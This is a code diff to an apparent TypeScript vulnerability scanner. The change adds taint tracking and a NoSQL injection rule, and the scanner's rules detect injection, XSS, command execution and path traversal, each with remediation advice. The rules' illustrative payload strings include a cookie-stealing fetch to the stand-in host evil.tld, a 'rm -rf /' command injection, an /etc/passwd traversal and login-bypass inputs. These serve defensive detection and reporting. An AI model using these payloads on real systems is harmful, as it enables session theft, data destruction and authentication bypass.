@@ -1,8 +1,10 @@
-// CrackScope attack-simulation engine — Part 1 (heuristic core).
-// Analyzes user-submitted source files, simulates exploitation paths for
-// each weakness class, and produces a pentest-style scored report.
-// Pure TypeScript so it runs instantly client-side; Part 3 (AST + taint
-// tracking) and Part 8 (AI deep analysis) will layer on top of this API.
+// CrackScope attack-simulation engine — Part 3 (taint-tracked heuristics).
+// Analyzes user-submitted source files, tracks user-controlled data from
+// sources to dangerous sinks (lib/taint), simulates exploitation paths for
+// each confirmed weakness, and produces a pentest-style scored report.
+// Pure TypeScript so it runs instantly client-side; Part 8 (AI deep
+// analysis) will layer on top of this API.
+import { computeTaint, isLineTainted } from "@/lib/taint";
 
 export type Severity = "critical" | "high" | "medium" | "low" | "info";
 
@@ -55,6 +57,8 @@ interface Rule {
   payload: string;
   pattern: RegExp;
   maxMatchesPerFile?: number;
+  /** Only fire when the matched line carries user-controlled data (taint). */
+  taintRequired?: boolean;
   /** Skip lines containing any of these (naive false-positive dampening). */
   safeHints?: string[];
 }
@@ -73,6 +77,7 @@ const RULES: Rule[] = [
     payload: `Input: username = admin'--\nResulting query: SELECT * FROM users WHERE name='admin'--' AND pass='...'\nEffect: password check bypassed; trailing conditions commented out.`,
     pattern: /\b(?:query|execute|exec|raw)\s*\(\s*[`'"][^`'"]*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^`'"]*[`'"]?\s*\+/i,
     maxMatchesPerFile: 5,
+    taintRequired: true,
     safeHints: ["?", "prepare", "parameterized"],
   },
   {
@@ -103,6 +108,7 @@ const RULES: Rule[] = [
     payload: `Input: <img src=x onerror="fetch('https://evil.tld?c='+document.cookie)">\nEffect: session cookies exfiltrated to attacker server on page load.`,
     pattern: /\.innerHTML\s*=|dangerouslySetInnerHTML|document\.write\s*\(|v-html/,
     maxMatchesPerFile: 5,
+    taintRequired: true,
   },
   {
     id: "XSS-002",
@@ -131,6 +137,7 @@ const RULES: Rule[] = [
     payload: `Input: filename = report.pdf; rm -rf /\nCommand: cat report.pdf; rm -rf /\nEffect: arbitrary command execution on the server.`,
     pattern: /(?:exec|execSync|system|popen|shell_exec|subprocess\.(?:call|run|Popen))\s*\([^)]*(?:\+|`|\$\(|%s|f["'])/,
     maxMatchesPerFile: 5,
+    taintRequired: true,
     safeHints: ["execFile", "argv"],
   },
   {
@@ -260,6 +267,22 @@ const RULES: Rule[] = [
     payload: `Input: file = ../../../../etc/passwd  (or ..\\..\\..\\windows\\win.ini)\nEffect: arbitrary file read outside the intended folder.`,
     pattern: /(?:readFile|createReadStream|sendFile|open|unlink|fs\.(?:read|write))\s*\([^)]*(?:\+\s*(?:req|request|params|query)|\.\.\b)/,
     maxMatchesPerFile: 5,
+    taintRequired: true,
+  },
+  {
+    id: "NOSQL-001",
+    title: "NoSQL operator injection (query object from request)",
+    severity: "critical",
+    category: "Injection",
+    owasp: "A03:2021 – Injection",
+    description:
+      "A database query is built directly from a request object. Attackers send JSON operators (e.g. {\"$gt\":\"\"}, {\"$ne\":null}, {\"$where\":…}) to alter query logic — the classic NoSQL login bypass and data exfiltration primitive.",
+    remediation:
+      "Never pass raw request objects into queries. Pick typed fields, validate with a schema (e.g. zod), and strip keys beginning with $ or containing dots before they reach the driver.",
+    payload: `Login POST body: {"email":{"$gt":""},"password":{"$gt":""}}\nEffect: query matches the first user regardless of password — authentication bypass.\nVariant: {"$where":"this.role=='admin'"} for blind extraction.`,
+    pattern: /\.(?:find|findOne|deleteOne|deleteMany|updateOne|updateMany|aggregate)\s*\(\s*(?:req\.(?:body|query|params)|\{\s*\.\.\.req\.)/,
+    maxMatchesPerFile: 5,
+    taintRequired: true,
   },
   {
     id: "SSRF-001",
@@ -378,6 +401,7 @@ export function scan(inputs: ScanInput[]): ScanResult {
     if (language !== "Unknown") languages.add(language);
     const lines = input.content.split("\n");
     linesScanned += lines.length;
+    const taint = computeTaint(lines);
 
     for (const rule of RULES) {
       let matches = 0;
@@ -388,6 +412,7 @@ export function scan(inputs: ScanInput[]): ScanResult {
         if (rule.safeHints?.some((h) => line.toLowerCase().includes(h.toLowerCase()))) continue;
         const m = rule.pattern.exec(line);
         if (!m) continue;
+        if (rule.taintRequired && !isLineTainted(line, taint)) continue;
         matches++;
         findings.push({
           ruleId: rule.id,
@@ -457,7 +482,7 @@ export function buildMarkdownReport(name: string, result: ScanResult): string {
   lines.push("");
   lines.push("## Methodology");
   lines.push(
-    "Automated attack simulation: pattern-based weakness discovery across injection, XSS, command execution, cryptography, authentication, access control, SSRF, deserialization, and misconfiguration classes (OWASP Top 10 2021 mapped). Each finding includes a simulated exploitation path.",
+    "Automated attack simulation with taint-tracked dataflow: user-controlled sources (request params, bodies, forms, argv) are propagated through local assignments, and injection/XSS/command sinks only report on confirmed source→sink flows. Weakness classes cover injection, XSS, cryptography, authentication, access control, SSRF, deserialization, and misconfiguration (OWASP Top 10 2021 mapped). Each finding includes a simulated exploitation path.",
   );
   lines.push("");
   lines.push("## Findings");
